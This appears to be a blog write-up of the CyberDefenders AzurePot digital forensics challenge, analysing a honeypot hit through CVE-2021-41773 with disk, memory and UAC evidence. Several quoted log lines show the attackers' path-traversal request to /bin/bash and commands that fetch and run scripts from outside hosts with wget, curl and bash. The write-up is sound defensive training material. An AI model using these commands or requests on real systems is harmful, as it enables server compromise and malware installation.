---
title: "Cyberdefenders · Digital Forensics · Azurepot"
date: 2023-04-24T21:14:19+02:00
draft: false
---

This is my proposed solution for the cyberdefenders's challenge [AzurePot](https://cyberdefenders.org/blueteam-ctf-challenges/101) published on April 20, 2023.

The scenario : 

>This Ubuntu Linux honeypot was put online in Azure in early October to watch what happens with those exploiting CVE-2021-41773.

>Initially, there was a large number of crypto miners that hit the system. You will see one cron script meant to remove files named kinsing in /tmp. This was a way of preventing these miners so more interesting things could occur.

There are three files:

- sdb.vhd.gz 
- VHD of the main drive obtained through an Azure disk snapshot
- ubuntu.20211208.mem.gz
- Dump of memory using Lime
- uac.tgz
- Results of UAC running on the system

>Items were obtained in the order above - the drive was snapshotted, memory was grabbed, then UAC was run.

Helpful Tools:

- FTK Imager (not mandatory; you can mount the vhd file on Linux)
- Text Editor (I like VsCode since it's much efficient than gedit or sublime for large files)
- grep
- awk (not used here)
- Volatility2 and 3 (not mentionned in the scenario but useful for the two last questions)

---

**NOTA :**

For the first 9 questions, you have to browse the disk dump file (sdb.vhd). You can use FTK Imager or you can mount it on Linux. I used this tutorial: [How to mount Virtual Hard disk (VHD) file in Ubuntu Linux?](https://linux.how2shout.com/mount-virtual-hard-disk-vhd-file-ubuntu-linux/) because I have neither Windows nor Wine.

## Q1 There is a script that runs every minute to do cleanup. What is the name of the file?

*file: sdb.vhd*

I you don't know what `cron` files are, look for scripts that run periodically. On a Linux system you can find it here: `/var/spool/cron/crontabs`.

```
...
# m h  dom mon dow   command
* * * * * /root/.remove.sh
```

Answer : `.remove.sh`

## Q2 The script in the Q#1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file?

*file: sdb.vhd*

Scenario gives a hint: *You will see one cron script meant to remove files named kinsing in /tmp*.

So in `/tmp` I list all the files:

```
# ls -lah
total 2,4G
drwxrwxrwt  9 root   root    12K déc.   8  2021 .
drwxr-xr-x 23 root   root   4,0K déc.   4  2021 ..
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 .font-unix
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 .ICE-unix
-r--r--r--  1 root   root      0 oct.   9  2021 kdevtmpfsi
-r--r--r--  1 root   root   3,8M oct.  11  2021 kdevtmpfsi324024279
-r--r--r--  1 root   root   3,8M oct.  11  2021 kdevtmpfsi824415644
-r--r--r--  1 root   root      0 oct.   9  2021 kinsing
...
```

The first one is `kinsing` (oct) and this this the answer.

## The script in Q#1 changes the permissions for some files. What is their new permission?

*file: sdb.vhd*

Q1 gives me location of `.remove.sh`, I print its content :

```
# cat root/.remove.sh 
#!/bin/bash

for PID in `ps -ef | egrep "kinsing|kdevtmp" | grep "/tmp"  | awk '{ print $2 }'`
do
	kill -9 $PID
done

chown root.root /tmp/k*
chmod 444 /tmp/k*
```

The script changes permissions to `444`.

## Q4 What is the sha256 of the botnet agent file?

*file: sdb.vhd*

The botnet agent is not located on `/tmp` but on `/var/tmp` I don't know why, maybe to hide and not locate it in the same directory as the cryptomineers. In this directory you could see an executable file and calculate its sha256 sum :

```
# ls -lah var/tmp
total 68K
drwxrwxrwt  5 root   root   4,0K déc.   8  2021 .
drwxr-xr-x 13 root   root   4,0K sept. 28  2021 ..
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 cloud-init
-rwxr-xr-x  1 daemon daemon  48K nov.  11  2021 dk86
...

# sha256sum var/tmp/dk86
0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049  var/tmp/dk86
```

## Q5 What is the name of the botnet in Q#4?

*file: sdb.vhd*

Put the hash into [VirusTotal](https://www.virustotal.com/gui/file/0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049) and you will see that the popular threat label is `trojan.linux/tsunami`.

## Q6 What IP address matches the creation timestamp of the botnet agent file in Q#4?

*file: sdb.vhd*

The CVE-2021-41773 is related to Appache2 (scenario). Check the Apache2 log files will be helpful in answering the following questions. Theses files are located on `/var/log/apache2/access_log` file. Unfortunately, `access_log` and `error_log` files are too big for a raw investigation. The tip is to filter on the creation timestamp of `dk86`:

```
# stat var/tmp/dk86
  Fichier : var/tmp/dk86
   Taille : 48748     	Blocs : 96         Blocs d'E/S : 4096   fichier
Périphérique : 3ah/58d	Inœud : 921         Liens : 1
Accès : (0755/-rwxr-xr-x)  UID : (    1/  daemon)   GID : (    1/  daemon)
Accès : 2021-11-11 20:09:51.454413754 +0100
Modif. : 2021-11-11 20:09:51.454413754 +0100
Changt : 2021-11-11 20:09:51.454413754 +0100
  Créé : -
```

**Be carreful timezone is displayed as +1 so you have to substract one hour to keep the timezone of the disk dump.**

Use `grep` on the `access_log` (`error_log` does not return anything) and you have the botnet agent IP:

```
grep 11/Nov/2021:19:09:51 var/log/apache2/access_log
141.135.85.36 - - [11/Nov/2021:19:09:51 +0000] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1" 200 - "-" "-"
```

## Q7 What URL did the attacker use to download the botnet agent?

*file: sdb.vhd*

I'm not sure of my reasoning, but as the attacker tried to exploit Apache2, interesting fingerprints were recorded in `error_log`. At this time we know this:

- botnet agent name: `dk86`
- attacker exploit tries to exploit CVE-2021-41773
- a quick look inside `error_log` show that there is a bash injection
- timestamp of the botnet file creation : 11/Nov/2021:19:09:51 (the dowloading timestamp must be smaller)

Assuming the hacker downloaded the botnet agent earlier in the day, we could create an accurate filter. I assume the attacker used `curl` or `grep` to download the payload.

```
# grep -E 'Nov 11 .* 2021.* (wget|curl).*dk86' var/log/apache2/error_log
[Thu Nov 11 19:07:41.956674 2021] [dumpio:trace7] [pid 804:tid 139978797401856] mod_dumpio.c(103): [client 141.135.85.36:51774] mod_dumpio:  dumpio_in (data-HEAP): echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;
[Thu Nov 11 19:07:41.962142 2021] [cgi:error] [pid 804:tid 139978797401856] [client 141.135.85.36:51774] AH01215: /bin/bash: line 1: `echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &;': /bin/bash
[Thu Nov 11 19:09:29.415116 2021] [dumpio:trace7] [pid 803:tid 139978805794560] mod_dumpio.c(103): [client 141.135.85.36:51978] mod_dumpio:  dumpio_in (data-HEAP): echo; wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86;
```

URL appears !

## Q8 What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?

*file: sdb.vhd*

Tricky question because the attacker does not used the same C2 serveur as in the previous question. A `grep` filter on `http://138.197.206.223:80` returns nothing more than the previous question. My thinking was to expand my timestamp filter (no longer on the day but on the whole month of November) and look at the injected bash.

```
# grep -E 'Nov.*2021.*(wget|curl)' var/log/apache2/error_log
[Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash
...
```

We need more accuracy in the filter. Some of the matches are on error on `curl` or `wget` so we could improve the regex in order to catch only the commands and not the error (adding ' \\-' at the end catch the command line and exclude error messages):

```
# grep -E 'Nov.*2021.*(wget|curl) \-' var/log/apache2/error_log
[Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash
...
```

Even better, we could see that the attacker dowloaded strings encoded in base64. Let's retrieve all the b64 encoded strings and decode:

```
...grep flags ... --data-urlencode 's=UE...Cg==' -o .install; chmod +x .install; sh .install > /dev/null 2>&1 & 
		echo 'Done'
	else
		echo 'Already install. Started'; cd .log/101068/.spoollog && sh .cron.sh > /dev/null 2>&1 & 
	fi
else 
	echo 'Already install Running'
fi
```

Two interesting things:

- a file named `.install`
- an another string encoded in base64 let's decode it

```
...
rm -rf .install
```

The file `.install` remove itself, this is the flag !

## Q9 The attacker downloaded sh scripts. What are the names of these files?

*file: sdb.vhd*

0_cron.sh, 0_linux.sh, ap.sh

At the previous step, you might found theses files. But we can found theses files applying this filter:

```
# grep -Eo '(curl|wget).*.{5}\.sh' var/log/apache2/error_log|uniq
curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh
curl -o-  http://86.105.195.120/cleanfda/init.sh
curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh
...
```

There is some bash files and I think they are all potentially malicious. But the ones that fit the expected pattern are :

- `0_cron.sh`

- `0_linux.sh`

- `ap.sh`

## Q10 Two suspicious processes were running from a deleted directory. What are their PIDs?

*file: uac*

We are searching for processes so let's explore the `live_response/process` folder. We could see that some of the files are named with a command name (for example `ps.txt`). A command used to link a process with a deleted directory is `lsof` so let's check `lsof_-nPl.txt`. Inside, the `NAME` column seems to indicate the location of the process, let's search for deleted directory.

```
# grep 'deleted' live_response/process/lsof_-nPl.txt
COMMAND     PID   TID     USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
none        609              0  txt       REG                0,1     8632      15254 / (deleted)
sleep      6388              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
```

`agettyd` have a valide name, which does not mean that is not a malicious process, but there it is more suspicious: `src.sh` (PID `20645`); it appears in the `error_log` file. At the same place, there was an another process was running : PID `6388`. We have our two PIDs.

## Q11 What is the suspicious command line associated with the 2nd PID in Q#10?

*file: uac*

To link command line and PID we can use `ps -e` and we have `ps_-ef.txt` file. Let's grep it and get the command line:

```
# grep 20645 live_response/process/ps_-ef.txt
UID        PID  PPID  C STIME TTY          TIME CMD
daemon   20645     1  0 Nov14 ?        03:01:59 sh .src.sh
```

## Q12 UAC gathered some data from the second process in Q#10. What is the remote IP address and remote port that was used in the attack?

*file: uac*

The gathered datas are in `live_response/process/proc/<num_proc>`. The `environ.txt` file contains some interesting informations:

```
...
REMOTE_ADDR=116.202.187.77
...
REMOTE_PORT=56590
...
```

## Q13 Which user was responsible for executing the command in Q#11?

*file: uac*

In the Q11 (`ps_-ef.txt`), we have the response: `deamon`.

## Q14 Two suspicious shell processes were running from the tmp folder. What are their PIDs?

*file: uac*

Like in the Q10, we can link the location with the PIDs in `lsof_-nPl.txt` and filter using grep:

```
# grep -E 'sh.*\/tmp' live_response/process/lsof_-nPl.txt
COMMAND     PID   TID     USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
sh        15853              1  cwd       DIR               8,17    12288       4059 /tmp
sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
sh        21785              1  cwd       DIR               8,17    12288       4059 /tmp
```

Two new PIDs appear: `15853` and `21785` (20645 was already known).

## Q15 What is the MAC address of the captured memory?

*file: ubuntu.20211208.mem*

The most technical part of the challenge begin here. Some of the information may be incorrect, I have recently learned these concepts and I am not comfortable with creating profiles and kernel specification yet. I think you could answer the next two questions with `strings|grep` but it is more exctiting to create a custom profile.

Since the dump was not made on a Windows machine, `Volatility2` can't parse natively the mem file, we have to build our own profile. I follow this tutorial to make the profile: [Security Post-it #3 – Volatility Linux Profiles](https://beguier.eu/nicolas/articles/security-tips-3-volatility-linux-profiles.html).

Using `Volatility3` you can get the kernel version of the mem dump: 

```
# volatility3 -f ubuntu.20211208.mem banner
Volatility 3 Framework 2.4.2
Progress:  100.00		PDB scanning finished                      
Offset	Banner

0x312001a0	Linux version 5.4.0-1059-azure (buildd@lcy01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #62~18.04.1-Ubuntu SMP Tue Sep 14 17:53:18 UTC 2021 (Ubuntu 5.4.0-1059.62~18.04.1-azure 5.4.140)
```

So this the kernel version is `5.4.0-1059-azure`,  and it is a `Ubuntu 18.04`.

Next, go to the linux tool directory in vol2 and modify the `KVER` variable in `Makefile` with the kernel version:

```
# cd volatility/tools/linux

# The KVER variable must contains the kernel version (volatility/tools/linux/Makefile):
KVER ?= 5.4.0-1059-azure
```

Next, run a `Docker` container using a `Ubuntu 18.04` image (the Ubuntu version where was dumped the RAM). Note that other Ubuntu version will not work, you have to use the **same** version.
 
```
# docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash
```

Note that the `d#` symbol represents the container prompt. **Update** the OS and install the following tools: 

- `build-essential`
- `dwarfdump`
- `make`
- `zip`

Most important: install `linux-image-<kernel_version>` and `linux-headers-<kernel_version>`. For the challenge the packages will be:

- `linux-image-5.4.0-1059-azure`
- `linux-headers-5.4.0-1059-azure`

Once all is installed, go to the `volatility` directory and build the `dwarf-tools` file:

```
d# cd /volatility
d# make
make -C //lib/modules/5.4.0-1059-azure/build CONFIG_DEBUG_INFO=y M="/volatility" modules
make[1]: Entering directory '/usr/src/linux-headers-5.4.0-1059-azure'
  CC [M]  /volatility/module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC [M]  /volatility/module.mod.o
  LD [M]  /volatility/module.ko
make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-1059-azure'
dwarfdump -di module.ko > module.dwarf
make -C //lib/modules/5.4.0-1059-azure/build M="/volatility" clean
make[1]: Entering directory '/usr/src/linux-headers-5.4.0-1059-azure'
  CLEAN   /volatility/Module.symvers
make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-1059-azure'
```

**IMPORTANT: if you encounter an error relative to a missing licence in `/volatility/module.c`, then add this line at this end of `module.c`:**

```c
MODULE_LICENSE("GPL");
```

Finnaly, build the profile (`Ubuntu-azure.zip`):

```
d# zip Ubuntu-azure.zip module.dwarf /boot/System.map-5.4.0-1059-azure
```

`/boot/System.map-5.4.0-1059-azure` should exists inside your Docker. If not, you have not installed the right kernel packages. Quit the Docker and copy the `Ubuntu-azure.zip` file into `volatility/plugins/overlays/linux`.

---

Do you have built the profile correctly? Let's try to use it in `Volatility`:

```
# #display information about vol profiles
# python2 vol.py --info|grep Profile
Volatility Foundation Volatility Framework 2.6.1
Profiles
LinuxUbuntu-azurex64  - A Profile for Linux Ubuntu-azure x64
...
```

If you see `LinuxUbuntu-azurex64` chances are your profile is valid, let's test it. We are looking for the MAC address of the machine, according to the [vol2 documentation]
(https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf), `linux_ifconfig` should give me the answer.

```
# python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_ifconfig

Volatility Foundation Volatility Framework 2.6.1
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
lo               127.0.0.1            00:00:00:00:00:00  False          
eth0             10.0.0.4             00:22:48:26:3b:16  False    
```

Here we go! The eth0 MAC address is the good answer :)

## Q16 From Bash history. The attacker downloaded an sh script. What is the name of the file?

*file: ubuntu.20211208.mem*

`linux_bash` plugin gives the bash history, let's make a grep on the output:

```
# python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_bash|grep -E '(wget |curl ).*\.sh'
Volatility Foundation Volatility Framework 2.6.1
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://88.218.227.141/wget.sh
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://185.191.32.198/unk.sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep ".sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep ".sh"
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep "\.sh"

```

Both of the IP are reported as malicious on [VirusTotal](https://www.virustotal.com/), so I think the attacker downloaded at least two malicious files via bash. The only files that matches the pattern is `unk.sh`.
